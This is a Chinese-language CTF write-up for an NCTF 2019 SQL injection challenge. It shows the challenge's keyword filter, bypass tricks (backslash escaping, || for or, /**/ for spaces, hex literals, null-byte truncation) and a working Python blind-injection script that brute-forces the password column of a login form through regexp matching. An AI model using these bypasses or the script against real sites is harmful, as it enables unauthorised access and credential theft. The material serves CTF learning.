# SQLI
## 考察知识点：
### 1.无法使用select时的注入
### 2.各种关键字替换

### 解题思路
### 1.fuzz
得到过滤名单：
```
"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|\'|=|
|in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";
```

发现过滤异常严格，连select都被过滤了,采用过滤select时的堆叠注入，但是table|database也被过滤...

### 2.但是这个地方采用的是登陆框的形式，有两个参数可以控制，并且给出了sql语句，就是简单的拼接

### 3.本地实验

虽然单引号被过滤，但是此处不难想到可以转义


![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/南邮ctf2019/images/9F222969F8D74D47845779DE0B3B383BSQLi1.png)

在本地执行时，regexp会将内容含有a的列匹配出来

## 此时本题的思路就明显了，可以爆破匹配passwd字段的内容。

但是此时还有一个问题，我们无法知道，我们输入的语句是否执行成功

### 4.在靶机进行尝试

```
or-->||
空格-->/**/
'a'-->0x61
最后的单引号-->%00
```

### 5.匹配的内容爆破尝试

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/南邮ctf2019/images/9422BA9EF2F6445C9260447B308BCE96SQLi2.png)

会返回两种内容，推测语句执行成功时，页面不会给出`alert("try to make the sqlquery have its own results")`的提示

### 6.此时可以写出盲注脚本(或者也可以说是爆破)

这里给一下在大佬脚本基础上修改的脚本

```
# python2
# coding=utf-8
import requests

s = requests.session()

url = "http://nctf2019.x1ct34m.com:40005/index.php"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}
cookies = {

}

flag = ""
first_num = ""
# strings = '#abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

# 将所有字符组合，爆破密码
esay_string = "yeiklnoruvwEIKLNORUVWY0789_"
# esay_string = "adimnADIMN"

#该字符串如果在passwd中，则将他加入组合与其他字符串拼接
# 得到所有属于passwd的字符串组合
def assembly(e):
    res1=''
    for i in e:
        res1 += hex(ord(i))
    res1 = res1.replace("0x", "")
    res1 = "0x" + res1
    # print(res1)
    return res1

for j in range(100):
    # for i in strings:
    for i in esay_string:
        # 此处的chr(0）为空字符，在sql中有截断作用
        # 得到密码中的所有的字符
        # payload = '/**/||passwd/**/regexp/**/{};{}'.format(hex(ord(i)), chr(0))
        # payload = '/**/||username/**/regexp/**/{};{}'.format(hex(ord(i)), chr(0))
        parmy=assembly(flag+i)
        payload = '/**/||passwd/**/regexp/**/{};{}'.format(parmy, chr(0))
        # payload = '/**/||username/**/regexp/**/{};{}'.format(parmy, chr(0))

        data = {
            'username': '\\',
            'passwd': payload
        }
        r = requests.post(url=url, headers=headers, data=data)
        # print payload
        # print r.content.decode("utf-8")

        if "go back to get the password" in r.content.decode("utf-8"):
            # 对全局变量flag进行叠加
            flag=flag+i
            # print r.content.decode("utf-8")
            first_num = first_num + i
            print first_num

```